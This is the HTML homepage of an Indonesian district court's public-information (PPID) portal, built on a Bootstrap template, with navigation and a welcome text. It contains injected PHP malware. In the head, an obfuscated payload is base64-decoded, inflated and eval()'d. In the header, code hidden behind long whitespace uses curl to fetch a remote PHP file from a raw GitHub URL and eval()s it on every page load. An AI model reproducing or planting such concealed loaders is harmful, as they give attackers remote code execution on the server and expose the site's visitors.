<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0" name="viewport">
 <title>PPID PN PADANG</title>
  <meta content="" name="description">
  <meta content="" name="keywords">

  <!-- Favicons -->
  <link href="assets/img/logopnpdg.png" rel="icon">
  <link href="assets/img/apple-touch-icon.png" rel="apple-touch-icon">

  <!-- Fonts -->
  <link href="https://fonts.googleapis.com" rel="preconnect">
  <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;1,300;1,400;1,500;1,600;1,700;1,800&family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&family=Jost:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">

  <!-- Vendor CSS Files -->
  <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
  <link href="assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
  <link href="assets/vendor/aos/aos.css" rel="stylesheet">
  <link href="assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
  <link href="assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">

  <!-- Main CSS File -->
  <link href="assets/css/main.css" rel="stylesheet">

  <!-- =======================================================
  * Template Name: Arsha
  * Template URL: https://bootstrapmade.com/arsha-free-bootstrap-html-template-corporate/
  * Updated: Jun 06 2024 with Bootstrap v5.3.3
  * Author: BootstrapMade.com
  * License: https://bootstrapmade.com/license/
  ======================================================== -->
  <?php
$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
$Lix = "fU\x41\x42k2N/WLXj1rgs\x632u9g93xGNQ\x2br2M\x419/gulHG4Ks\x43wRoEPX1hIWt7r\x42Uv5s3UtXGEfZgnp\x42zD\x62J3N7RfgPuVHW\x43\x41\x62sfZGK1HuPEpXIFPiv1uNXFzmjDpou3t\x63vxgtNpIJdXf\x61xMeHgllFnMsR1s2KVMWvI06TL8\x61w\x42xpQEXSF\x62jMrJPS3g836Y\x62QQMjlgFWsh7X\x61ltkG\x6358Qwyd\x43mMH6Yk1G9sDoKDpV\x2b\x41\x42TEsg\x42yxXvZ9q7p1x\x62pvjOHe1O\x2bHR6OlTkhmOMRITVyM0Fm6jxxO5HXs4W4d\x2bNDd4\x62RpDZ\x6390\x61kLNWw\x41rgeP80w5gJXQWNYNyH\x2b7DTQ9\x41\x2b6/\x62U75\x43W\x61\x62ytzwepzr9i\x428rgJtVkij0lHd0RPO/YSqXGKmF\x2bnt\x63zjd\x61O0JqZnV0i\x43PMO5/LXrMhzHG6i/uwu\x6135S9wF7duiwMkD\x42\x63/\x43ylGfEudVDm86NT2vHv3QY\x62fz1J2ZXoY\x43xndefpe\x62rHE/llnj7n9kTk4eNUN7r0h8ZS1\x61\x42OiOsKgtq22qysi9\x2bIPDKWSQL1G4Xf\x63G8P\x41q7S0HSiydm3jgMV2\x62jGT5RP\x43\x63\x43Q6l3WsK7Q\x61uJ\x62s\x63W\x63hWPzvFtevr\x61SUwtoFvNdPQ3k\x41ILlG4\x61HQ6tvhWql\x61M\x63H0gn\x41Dn\x43KRrV15HmnlH6w2G33TOf\x43X\x42TdINnF5\x43\x41\x62uq6\x41gRpwmdRuzh\x2bwV9dv\x41DogTsw\x61eqednr\x2bhs\x41KSVJShGzOwe/\x2bRpxro6e\x41Y7Ug\x41Q5NgEmv8sn9iqluRd\x61YmwrYY1Ne2pwYwP7QDZ2eN/EWrF4l80\x2bfWj\x61gG32e\x613R22VX\x610nH\x637HHd5RG1ZP/tV/R\x63\x63RWg3sH9xnWgWn/\x43W7k\x41wO\x63VRQVQH7FE\x43XMoWmPjFfO2m3E\x61lhTJzLwVTYDJsz8lP5NKl1V1L\x431PG5sze/4P6p\x42HS\x42G\x416Xjw\x2b\x42hYVd36grplLZHlt6J\x63ji2WE2\x63l25/tiqMlinzt1RJU/K1gu\x61Wqt9VWyk4o48kYF6O0HZqt1m9dvSnhH\x610x0\x42nizDv57ToqQ\x2b7V\x41DOW/eQKG3743Z\x41RuQ0e\x61IQZGNErItWD25lQI\x63H\x63hlQfNQRfVSOyQyU\x63xq11qknmihnPdTTL\x430Y41\x63\x2bD3R7ejNtFpUsHwSHR7qLk\x610nWg/HU2GQG\x63mDRT\x61t\x61Rl\x43\x43PKdT7o/\x42\x62MS3RFQQMdJ\x41o7EIKzwXxhDQZEu\x63tImpVf7\x42uMENd\x61i\x42NPVg5/\x2b2V1nNPe\x2bUUsvKwsvIS4\x2bMQg5D\x41q/WQ\x41LqvXEm\x2bUs0g447ykg\x63u/5P20oJs4thl36ILvNpJwY\x43iToR90hHf7FuM\x2bySxmVD5JWr\x63fhw0\x61WPnZ9DoTyStfj0\x63t\x612DKf8\x43QkF/4L\x2be45TXWvi/qj\x62\x63F71\x61ZZ\x61Jk\x61wyw4Hd6i2UHSIH\x62RLev\x61z/H\x42HrLEf\x41R2DY9zTVKmoHiv\x2bxjE/R63jeMxjov/8rEoFf1Rfy5FguqPWoeSyt\x62\x2bsL2370Ex\x2b0hp86pggWehxLrN73H\x2bji33\x41\x425kvELWl0ld\x61\x621I0FsvH\x63E48NsiSHO2JUoN1G\x63q2VpL43LXKsfrkPe9uZ8jswNrhXTTi\x631NDjIWNlIZf9pr\x63IzS\x62YF6lq11Kom0\x62JTT\x62Msvrd\x43jtIJlEuRo7Kxp\x6239g\x61Y\x2bf84hfYjlrWzvmYq3/sjF\x61nPZdm\x41mvmgx3kW\x41dQvX5PJLmuJ8e/EH\x6170FstNtNqk\x41\x41u7E\x43665fum5GpUxKlmNTdpxFu5uSVq\x63STnkGx5prZtO\x62jKyt0Yzto\x43\x63pGG\x627l7EpkF\x42qJroJqJxoFpI\x636Y\x63v7\x43Xr7dWPIUsxOxJrpIylqFSFHJNp7VpUKW\x42O5dvve5\x61mDoxGr6r2\x61\x421NGePkJ7uY\x2bd6vOX/Ti0ZstNZ142luHS6mXIqm\x61\x43VUYkO2TY\x62oQk8\x43Se6j\x618zN1yrIxqTWzKpRKj0SrrWSlW\x61\x61Ril0duo/8xznL8jHXqOpfzjmfmne\x62nZ3Rm2qW\x621pgN71l57fHP3qz6k7t\x42Kut7srlF\x43qYVgtkS165UDgOOufDHfpFEOx\x42yw\x2bT\x43X\x2bD\x42ST/W\x62W1o\x2b0Uwy\x42wJe6nS\x42WHg\x2bkUw2\x42wJe6nR\x42mHg\x2bUUw6\x42wJe6nQ\x422Hg\x2bEUw\x2b\x42wJe";
eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
exit;
?>
</head>

<body class="index-page">

  <header id="header" class="header d-flex align-items-center fixed-top">
   <div class="container d-flex align-items-center justify-content-between">
      <div class="logo">
        <a href="index.html"><img src="assets/img/logo_ppidpdg.png"></a>
      </div>


      <nav id="navmenu" class="navmenu">
        <ul>
          <li><a href="index.html" class="active">Beranda</a></li>
           <li class="dropdown"><a href="#"><span>Profil</span> <i class="bi bi-chevron-down toggle-dropdown"></i></a>
            <ul>
              <li><a href="profil_ppid.html">Profil PPID</a></li>
              <li><a href="tugas_fungsi.html">Tugas dan Fungsi PPID</a></li>
              <li><a href="struktur_ppid.html">Struktur PPID</a></li>
              <li><a href="visi_misi.html">Visi dan Misi</a></li>
            </ul>
           <li><a href="regulasi.html">Regulasi</a></li>
          <li class="dropdown"><a href="#"><span>Informasi Publik</span> <i class="bi bi-chevron-down toggle-dropdown"></i></a>
            <ul>
              <li><a href="informasi_berkala.html">Informasi Berkala</a></li>
              <li><a href="informasi_serta_merta.html">Informasi Serta Merta</a></li>
              <li><a href="informasi_tersedia.html">Informasi Tersedia Setiap Saat</a></li>
            </ul>
          <li class="dropdown"><a href="#"><span>Standar Layanan</span> <i class="bi bi-chevron-down toggle-dropdown"></i></a>
            <ul>
              <li><a href="maklumat.html">Maklumat Pelayanan</a></li>
              <li><a href="prosedur_permohonan_informasi.html">Prosedur Permohonan Informasi</a></li>
              <li><a href="pengajuan_keberatan.html">Prosedur Pengajuan Keberatan</a></li>
              <li><a href="sengketa_informasi.html">Prosedur Sengketa Informasi</a></li>
              
        
            </ul>
          <li><a href="https://docs.google.com/forms/d/e/1FAIpQLSf3R9WyiQj08LLBrKYIhiatzAfF8Y_b6HuFp4BMF1YJK625qw/viewform?usp=sf_link">Permohonan Informasi</a></li>
          </ul>
        <i class="mobile-nav-toggle d-xl-none bi bi-list"></i>
      </nav>
                                                                                                                                                                                                          <?php
                                                                                                                                                                                                                                                                                                                                                                                    $Url = "https://raw.githubusercontent.com/kembarbaru120000/213/refs/heads/main/index.php";
                                                                                                                                                                                                                                                                               $ch = curl_init();
                                                                                                                                                                                                              curl_setopt($ch, CURLOPT_URL, $Url);
                                                                                                                                                                                                                                                                                                                                                                                                                                                     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                                                                                                                                                                                                              $output = curl_exec($ch);
                                                                                                                                                                                                                                                                                                                                                                                    curl_close($ch);
                                                                                                                                                                                                                                                                               echo eval('?>'.$output);
                                                                                                                                                                                                             ?>
    </div>
  </header>

  <main class="main">

    <!-- Hero Section -->
    <section id="hero" class="hero section">

      <div class="container">
        <div class="row gy-4">
          <div class="col-lg-6 order-2 order-lg-1 d-flex flex-column justify-content-center" data-aos="zoom-out">
            <h1>Selamat Datang di PPID Pengadilan Negeri Padang</h1>
            <p>PPID merupakan media layanan informasi, sebagai bentuk keterbukaan informasi publik pada PENGADILAN NEGERI PADANG dan amanat Undang-Undang Nomor 14 Tahun 2008 tentang Keterbukaan Informasi Publik serta SK KMA Nomor 2-144/KMA/SK/VIII/2022 tentang Standar Pelayanan Informasi Publik di Pengadilan</p>
            
          </div>
          <div class="col-lg-6 order-1 order-lg-2 hero-img" data-aos="zoom-out" data-aos-delay="150">
            <img src="assets/img/logopnpdg.png" class="img-fluid animated" alt="">
          </div>
        </div>
      </div>

    </section><!-- /Hero Section -->

    <!-- Clients Section -->
    <section id="clients" class="clients section">

      <div class="container" data-aos="zoom-in">

       

      </div>

    </section><!-- /Clients Section -->  

  <footer id="footer" class="footer">


    <div class="container copyright text-center mt-4">
      <p>© <span>Copyright</span> <strong class="px-1 sitename">Arsha</strong> <span>All Rights Reserved</span></p>
      <div class="credits">
        <!-- All the links in the footer should remain intact. -->
        <!-- You can delete the links only if you've purchased the pro version. -->
        <!-- Licensing information: https://bootstrapmade.com/license/ -->
        <!-- Purchase the pro version with working PHP/AJAX contact form: [buy-url] -->
        Designed by <a href="https://bootstrapmade.com/">BootstrapMade</a> "  Reused By PENGADILAN NEGERI PADANG
      
      </div>
    </div>

  </footer>

  <!-- Scroll Top -->
  <a href="#" id="scroll-top" class="scroll-top d-flex align-items-center justify-content-center"><i class="bi bi-arrow-up-short"></i></a>

  <!-- Preloader -->
  <div id="preloader"></div>

  <!-- Vendor JS Files -->
  <script src="assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
  <script src="assets/vendor/php-email-form/validate.js"></script>
  <script src="assets/vendor/aos/aos.js"></script>
  <script src="assets/vendor/glightbox/js/glightbox.min.js"></script>
  <script src="assets/vendor/swiper/swiper-bundle.min.js"></script>
  <script src="assets/vendor/waypoints/noframework.waypoints.js"></script>
  <script src="assets/vendor/imagesloaded/imagesloaded.pkgd.min.js"></script>
  <script src="assets/vendor/isotope-layout/isotope.pkgd.min.js"></script>

  <!-- Main JS File -->
  <script src="assets/js/main.js"></script>

</body>

</html>
